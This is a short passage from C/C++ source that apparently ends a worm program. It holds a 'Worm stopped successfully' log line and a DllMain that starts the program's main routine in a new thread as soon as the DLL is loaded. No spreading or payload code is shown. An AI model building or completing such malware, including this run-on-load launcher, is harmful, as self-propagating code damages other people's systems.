    g_Logger.Info("Worm stopped successfully");
    return 0;
}

// ============================================================================
// DLL MAIN - Complete
// ============================================================================

BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
    switch (dwReason) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hModule);
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)WinMain, 
                        hModule, 0, NULL);
            break;
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
